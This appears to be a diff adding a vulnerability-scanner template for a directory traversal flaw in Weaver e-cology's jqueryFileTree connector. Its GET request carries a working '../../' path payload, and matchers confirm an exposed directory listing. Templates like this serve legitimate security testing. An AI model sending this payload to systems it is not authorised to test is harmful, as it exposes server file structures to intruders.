@@ -1,0 +1,21 @@
+id: weaver-e-cology-jqueryfiletree-directory-traversal
+info:
+  name: Weaver e-cology JqueryFileTree Directory Traversal
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: directory-traversal
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/hrm/hrm_e9/orgChart/js/jquery/plugins/jqueryFileTree/connectors/jqueryFileTree.jsp?dir=/page/resource/userfile/../../"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "'index.jsp','"
+          - "重命名"
+          - "新建目录"
+        part: body
